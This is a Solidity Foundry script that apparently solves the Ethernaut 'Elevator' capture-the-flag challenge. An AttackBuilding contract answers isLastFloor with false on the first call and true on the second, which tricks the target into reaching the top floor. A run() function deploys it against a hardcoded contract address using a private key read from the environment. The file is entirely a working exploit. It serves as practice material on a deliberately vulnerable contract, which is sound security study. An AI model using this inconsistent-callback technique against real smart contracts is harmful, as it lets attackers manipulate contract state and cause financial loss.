// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import {Script} from "forge-std/Script.sol";

contract AttackBuilding {
    uint256 public call_count = 0;

    constructor() {}

    function attack(Elevator _elevator) public {
        _elevator.goTo(10);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (call_count >= 1 && _floor == 10) {
            return true;
        }

        call_count += 1;
        return false;
    }
}

contract ElevatorAttack is Script {
    Elevator public elevator = Elevator(0xD11C640ba39F38d629c1A17cCBf13CFA2974D7a5);
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackBuilding building = new AttackBuilding();
        building.attack(elevator);

        vm.stopBroadcast();
    }
}